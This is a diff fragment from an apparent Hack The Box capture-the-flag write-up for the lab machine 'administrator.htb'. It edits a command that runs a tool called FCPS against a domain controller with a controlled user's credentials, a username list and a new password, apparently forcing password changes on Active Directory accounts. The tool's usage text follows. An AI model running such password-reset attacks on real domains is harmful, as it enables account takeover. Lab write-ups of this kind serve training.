@@ -9,7 +9,7 @@ In this blog by Juggarnaut-sec, the methodology is explained further "our curren
 
 ```
 python3 ~/Tools/FCPS.py -d administrator.htb -u 'Olivia' -p 'ichlie' -i 10.10.11.42 -f users.txt -n 'ichlie'
-python3 ~/Tools/FCPS.py -d administrator.htb -u 'Olivia' -p 'ichlie' -i 10.10.11.42 -f users.txt -n 'ichlie'
+~/Tools/FCPS.sh -d administrator.htb -u 'Olivia' -p 'ichlie' -i 10.10.11.42 -f users.txt -n 'ichlie'
 
 Usage: FCPS.py [-h] -d DOMAIN -u CONTROLLED_USER -p CONTROLLED_USER_PASSWORD -i DOMAIN_CONTROLLER_IP -f
                USERNAME_LIST -n NEW_PASSWORD
